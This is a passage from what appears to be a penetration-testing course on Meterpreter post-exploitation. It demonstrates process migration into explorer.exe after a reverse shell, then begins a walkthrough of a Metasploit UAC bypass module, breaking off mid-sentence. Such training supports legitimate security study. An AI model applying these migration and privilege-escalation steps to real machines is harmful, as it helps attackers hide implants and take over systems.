Using the `migrate` command, we can move the execution of our meterpreter to different processes.

To do this, we first run `ps` to view all running processes and then pick one, like `explorer.exe`, and issue the `migrate` command.

```
meterpreter > ps
```

```
Process List
============

PID    PPID    Name                                     Arch  Session  User  Path
---    ----    ----                                     ----  -------  ----  ----
3116   904     WmiPrvSE.exe
3164   3568    shell_reverse_msf_encoded.exe x86 1     corp\offsec C:\Users\Offsec\.corp\Desktop\shell_reverse_msf_encoded.exe
3224   808     msdtc.exe
3360   1156    shost.exe                                  x86   1      corp\offsec C:\Windows\System32\shost.exe
3544   808     syncbrs.exe
3568   1960    explorer.exe                               x86   1      corp\offsec C:\Windows\explorer.exe
3820   808     svchost.exe                                x86   1      corp\offsec C:\Windows\System32\svchost.exe
...
```

```
meterpreter > migrate 3568
[*] Migrateing from 3164 to 3568...
[*] Migration completed successfully.
```

![](bbox=[0.34, 0.54, 0.66, 0.56])

Note that we are only able to migrate into a process executing at the same privilege and integrity level or lower than that of our current process. In the case of Sync Breeze, since we are running a Meterpreter payload with maximum privileges (NT_SYSTEM), our choices are plentiful and we can migrate our shell to different user contexts by selecting a target process accordingly.

# 22.5.3 Post-Exploitation Modules

In addition to native commands and actions present in the core APIs of the Meterpreter, there are several post-exploitation modules we can deploy against an active session. Sessions that were created by execution of a client-side attack will likely provide us only with an unprivileged shell. But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we bypass User Account Control (UAC). In the previous example, we migrated our meterpreter shell to an `explorer.exe` process that is running at medium integrity. In the following steps, we will assume that we have gathered this shell through a client side attack.

A search for UAC bypass modules yields quite a few results. However, since in our example the compromised host is our Windows 10 Fall Creators Update version machine, we will focus on the `bypassuac_injection_winssx` module as it works well on this version of Windows. We will select the module and list its options. This reveals a single parameter named `SESSION`, which is the target Meterpreter session. Setting the session to our active Meterpreter session with `set SESSION 10`